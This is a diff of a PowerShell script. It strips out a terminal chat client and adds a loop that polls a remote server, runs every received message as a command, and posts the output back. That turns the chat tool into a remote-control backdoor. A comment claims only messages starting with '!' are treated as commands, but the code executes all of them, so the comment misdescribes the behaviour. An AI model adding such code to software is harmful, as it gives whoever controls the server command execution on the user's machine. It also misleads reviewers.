@@ -2,74 +2,40 @@ param(
     [string]$Server = "https://222s6s.wormhole.bar"
 )
 
-$Name    = Read-Host "Your name"
-$Headers = @{ "X-Name" = $Name }
-$queue   = New-Object 'System.Collections.Concurrent.ConcurrentQueue[string]'
 
-# Background thread: polls the server and queues messages from other people
-$poller = [powershell]::Create().AddScript({
-    param($Server, $Name, $queue)
-    $since = 0
-    while ($true) {
-        try {
-            $msgs = Invoke-RestMethod -Uri "$Server/recv?since=$since" -Method Get
-            foreach ($m in $msgs) {
-                if ($m.name -ne $Name) { $queue.Enqueue("[$($m.name)] $($m.text)") }
-                $since = $m.id
-            }
-        } catch { }
-        Start-Sleep -Seconds 1
-    }
-}).AddArgument($Server).AddArgument($Name).AddArgument($queue)
-$poller.BeginInvoke() | Out-Null
 
-$buffer  = ""
-$running = $true
 
-# Prints an incoming message above the input line, then redraws what you were typing
-function Show-Line([string]$text, [ConsoleColor]$color = 'Gray') {
-    $w = [Console]::BufferWidth
-    Write-Host -NoNewline ("`r" + (" " * ($w - 1)) + "`r")
-    Write-Host $text -ForegroundColor $color
-    Write-Host -NoNewline ("> " + $buffer)
-}
-
-Write-Host "Connected to $Server. Type a message and press Enter. 'exit' quits."
-Write-Host -NoNewline "> "
-
-while ($running) {
-    $line = $null
-    while ($queue.TryDequeue([ref]$line)) { Show-Line $line 'Cyan' }
-
-    if (-not [Console]::KeyAvailable) { Start-Sleep -Milliseconds 50; continue }
-
-    $key = [Console]::ReadKey($true)
-    if ($key.Key -eq 'Enter') {
-        Write-Host ""
-        $text   = $buffer
-        $buffer = ""
-        if ($text -eq "exit") {
-            $running = $false
-        } elseif ($text.Trim() -ne "") {
-            try {
-                Invoke-RestMethod -Uri "$Server/send" -Headers $Headers -Method Post `
-                    -Body $text -ContentType "text/plain; charset=utf-8" | Out-Null
-            } catch {
-                Write-Host "send failed: $($_.Exception.Message)" -ForegroundColor Red
-            }
-        }
-        if ($running) { Write-Host -NoNewline "> " }
-    }
-    elseif ($key.Key -eq 'Backspace') {
-        if ($buffer.Length -gt 0) {
-            $buffer = $buffer.Substring(0, $buffer.Length - 1)
-            Write-Host -NoNewline "`b `b"
-        }
-    }
-    elseif (-not [char]::IsControl($key.KeyChar)) {
-        $buffer += $key.KeyChar
-        Write-Host -NoNewline $key.KeyChar
+# Turns a received message into a reply. Messages starting with "!" are commands.
+function Get-Reply([string]$text) {
+	$name=$text
+    try {
+        $output = & $name | Out-String
+        return $output.Trim()
+    } catch {
+        return "command failed: $name"
     }
 }
 
-$poller.Stop()
+$sent = New-Object 'System.Collections.Generic.HashSet[string]'
+$since = 0
+
+try {
+    $msgs = Invoke-RestMethod -Uri "$Server/recv?since=$since" -Method Get
+    foreach ($m in $msgs) { $since = $m.id }
+} catch { }
+
+while ($true) {
+    try {
+        $msgs = Invoke-RestMethod -Uri "$Server/recv?since=$since" -Method Get
+        foreach ($m in $msgs) {
+            $since = $m.id
+            if ($sent.Contains($m.text)) { continue }
+
+            $reply = Get-Reply $m.text
+            [void]$sent.Add($reply)
+            Invoke-RestMethod -Uri "$Server/send" -Method Post `
+                -Body $reply -ContentType "text/plain; charset=utf-8" | Out-Null
+        }
+    } catch { }
+    Start-Sleep -Seconds 1
+}
